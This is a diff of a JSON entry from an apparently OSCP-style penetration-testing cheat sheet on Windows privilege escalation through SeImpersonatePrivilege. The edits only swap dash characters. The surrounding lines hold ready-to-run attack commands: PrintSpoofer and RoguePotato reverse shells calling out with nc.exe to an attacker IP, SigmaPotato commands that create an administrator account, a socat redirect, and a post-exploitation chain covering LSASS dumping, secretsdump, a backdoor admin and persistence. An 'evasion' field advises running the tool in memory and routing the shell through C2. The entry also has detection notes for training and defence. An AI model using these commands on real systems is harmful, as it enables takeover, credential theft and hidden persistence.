@@ -32,19 +32,19 @@
       "command": "xp_cmdshell c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\""
     },
     {
-      "label": "OSCP Ch16 — SigmaPotato: run command as SYSTEM via named pipe coercion (needs SeImpersonatePrivilege)",
+      "label": "OSCP Ch16 - SigmaPotato: run command as SYSTEM via named pipe coercion (needs SeImpersonatePrivilege)",
       "command": ".\\SigmaPotato \"net user <user> <pass> /add\""
     },
     {
-      "label": "OSCP Ch16 — SigmaPotato: add created user to local Administrators",
+      "label": "OSCP Ch16 - SigmaPotato: add created user to local Administrators",
       "command": ".\\SigmaPotato \"net localgroup Administrators <user> /add\""
     },
     {
-      "label": "OSCP Ch16 — check if SeImpersonatePrivilege is assigned (IIS/service context often has it)",
+      "label": "OSCP Ch16 - check if SeImpersonatePrivilege is assigned (IIS/service context often has it)",
       "command": "whoami /priv | findstr SeImpersonatePrivilege"
     }
   ],
-  "notes": "=== SeImpersonate — PrintSpoofer / RoguePotato ===\nModern replacement for JuicyPotato on Server 2019 and Windows 10 1809+.\n\n=== WHEN TO USE ===\nJuicyPotato DCOM technique was patched in Server 2019 and Win10 1809+\nPrintSpoofer: abuses Windows Print Spooler named pipe coercion\nRoguePotato: abuses OXID resolver coercion (requires port 135 redirect or outbound port 135)\n\n=== PRINTSPOOFER FLOW ===\n1. Confirm SeImpersonatePrivilege: whoami /priv\n2. Transfer PrintSpoofer.exe to target\n3. Set up listener: nc -lvnp 4444\n4. Execute:\n   .\\PrintSpoofer.exe -c \"nc.exe <ATTACKER_IP> 4444 -e cmd.exe\"\n   .\\PrintSpoofer.exe -i -c cmd   (interactive, if console available)\n\nMechanism:\n1. Creates named pipe \\\\.\\pipe\\<random>\\pipe\\spoolss\n2. Coerces Print Spooler (SYSTEM) to authenticate to the named pipe\n3. Impersonates the incoming SYSTEM token\n4. Spawns specified command with SYSTEM token\n\n=== ROGUEPOTATO ALTERNATIVE ===\n.\\RoguePotato.exe -r <ATTACKER_IP> -e \"nc.exe <IP> 4444 -e cmd.exe\" -l 9999\nRequires Socat on attacker: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999\n\n=== DECISION TREE ===\nSeImpersonatePrivilege present?\n  → OS < Server 2019 / Win10 1809? → JuicyPotato\n  → OS >= Server 2019 / Win10 1809? → PrintSpoofer or RoguePotato\n  → Print Spooler disabled? → RoguePotato (no Spooler dependency)\n\n=== CHAINING CONTEXT ===\nxp_cmdshell MSSQL → PrintSpoofer → SYSTEM\nWeb shell on IIS → PrintSpoofer → SYSTEM → secretsdump\nService account reverse shell → PrintSpoofer → SYSTEM → mimikatz / secretsdump\nAfter SYSTEM: dump LSASS, run secretsdump, add backdoor admin, deploy persistence OSCP Ch16 uses SigmaPotato (newer variant). SigmaPotato abuses named pipe coercion: coerces NT AUTHORITY\\SYSTEM to authenticate to a controlled named pipe, then impersonates via SeImpersonatePrivilege. Works on Server 2019/Win10 where JuicyPotato DCOM was patched. Also consider GodPotato, SweetPotato. Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).",
+  "notes": "=== SeImpersonate - PrintSpoofer / RoguePotato ===\nModern replacement for JuicyPotato on Server 2019 and Windows 10 1809+.\n\n=== WHEN TO USE ===\nJuicyPotato DCOM technique was patched in Server 2019 and Win10 1809+\nPrintSpoofer: abuses Windows Print Spooler named pipe coercion\nRoguePotato: abuses OXID resolver coercion (requires port 135 redirect or outbound port 135)\n\n=== PRINTSPOOFER FLOW ===\n1. Confirm SeImpersonatePrivilege: whoami /priv\n2. Transfer PrintSpoofer.exe to target\n3. Set up listener: nc -lvnp 4444\n4. Execute:\n   .\\PrintSpoofer.exe -c \"nc.exe <ATTACKER_IP> 4444 -e cmd.exe\"\n   .\\PrintSpoofer.exe -i -c cmd   (interactive, if console available)\n\nMechanism:\n1. Creates named pipe \\\\.\\pipe\\<random>\\pipe\\spoolss\n2. Coerces Print Spooler (SYSTEM) to authenticate to the named pipe\n3. Impersonates the incoming SYSTEM token\n4. Spawns specified command with SYSTEM token\n\n=== ROGUEPOTATO ALTERNATIVE ===\n.\\RoguePotato.exe -r <ATTACKER_IP> -e \"nc.exe <IP> 4444 -e cmd.exe\" -l 9999\nRequires Socat on attacker: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999\n\n=== DECISION TREE ===\nSeImpersonatePrivilege present?\n  → OS < Server 2019 / Win10 1809? → JuicyPotato\n  → OS >= Server 2019 / Win10 1809? → PrintSpoofer or RoguePotato\n  → Print Spooler disabled? → RoguePotato (no Spooler dependency)\n\n=== CHAINING CONTEXT ===\nxp_cmdshell MSSQL → PrintSpoofer → SYSTEM\nWeb shell on IIS → PrintSpoofer → SYSTEM → secretsdump\nService account reverse shell → PrintSpoofer → SYSTEM → mimikatz / secretsdump\nAfter SYSTEM: dump LSASS, run secretsdump, add backdoor admin, deploy persistence OSCP Ch16 uses SigmaPotato (newer variant). SigmaPotato abuses named pipe coercion: coerces NT AUTHORITY\\SYSTEM to authenticate to a controlled named pipe, then impersonates via SeImpersonatePrivilege. Works on Server 2019/Win10 where JuicyPotato DCOM was patched. Also consider GodPotato, SweetPotato. Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).",
   "references": [
     {
       "title": "PrintSpoofer (itm4n)",
@@ -85,7 +85,7 @@
   ],
   "exam": "exam-ok",
   "defense": {
-    "why_it_works": "PrintSpoofer exploits SeImpersonatePrivilege by creating a named pipe that impersonates the Print Spooler (SYSTEM). It uses the ImpersonateNamedPipeClient API — with SeImpersonatePrivilege, the service account can impersonate any client that connects, including the SYSTEM-level Spooler service. Works on Windows 10 and Server 2019 where JuicyPotato is blocked.",
+    "why_it_works": "PrintSpoofer exploits SeImpersonatePrivilege by creating a named pipe that impersonates the Print Spooler (SYSTEM). It uses the ImpersonateNamedPipeClient API - with SeImpersonatePrivilege, the service account can impersonate any client that connects, including the SYSTEM-level Spooler service. Works on Windows 10 and Server 2019 where JuicyPotato is blocked.",
     "prerequisites": "SeImpersonatePrivilege in current token. PrintSpoofer.exe binary. Print Spooler service running on the target. Works on Windows 10, Server 2016, Server 2019.",
     "impact": "SYSTEM-level code execution from a service account (IIS, MSSQL) on modern Windows, bypassing JuicyPotato mitigations in Server 2019+.",
     "detection": "PrintSpoofer.exe execution. Named pipe creation by service account with PrintSpoofer pattern. Sysmon Event 1: SYSTEM process spawned from IIS/MSSQL parent. EDR: token impersonation via named pipe.",
@@ -103,7 +103,7 @@
       "MITRE T1134.001",
       "MITRE T1068"
     ],
-    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet - the noisy part is the spawned shell, so route it through an existing C2 channel."
   },
   "variations": [
     {
